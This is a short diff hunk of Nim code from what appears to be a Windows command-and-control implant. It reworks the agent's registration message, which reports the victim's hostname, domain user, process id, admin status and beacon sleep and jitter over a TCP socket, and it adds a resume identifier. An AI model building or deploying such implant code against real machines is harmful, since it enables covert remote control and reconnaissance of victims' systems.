@@ -94,22 +94,22 @@ proc doRegister(t: var AgentTransport): bool =
   let regDom  = getEnvStr("USERDOMAIN", "")
   let regUsr  = getEnvStr("USERNAME", "UNKNOWN")
   let regUser = if regDom.len > 0: regDom & "\\" & regUsr else: regUsr
-  let req = %*{
-    "t": "register",
-    "p": %*{
-      "hostname":     regHost,
-      "username":     regUser,
-      "os":           "windows/amd64",
-      "pid":          int(GetCurrentProcessId()),
-      "transport":    "tcp",
-      "sleep_sec":    SleepSec,
-      "jitter_pct":   JitterPct,
-      "process_name": exeName(),
-      "is_admin":     isElevated(),
-      "parent_id":    ParentID,
-      "language":     "nim"
-    }
+  var regPayload = %*{
+    "hostname":     regHost,
+    "username":     regUser,
+    "os":           "windows/amd64",
+    "pid":          int(GetCurrentProcessId()),
+    "transport":    "tcp",
+    "sleep_sec":    SleepSec,
+    "jitter_pct":   JitterPct,
+    "process_name": exeName(),
+    "is_admin":     isElevated(),
+    "parent_id":    ParentID,
+    "language":     "nim"
   }
+  if t.agentId.len > 0:
+    regPayload["resume_id"] = %t.agentId
+  let req = %*{"t": "register", "p": regPayload}
   writeFrame(t.sock, $req)
   let frame = readFrame(t.sock)
   if frame.len == 0: return false
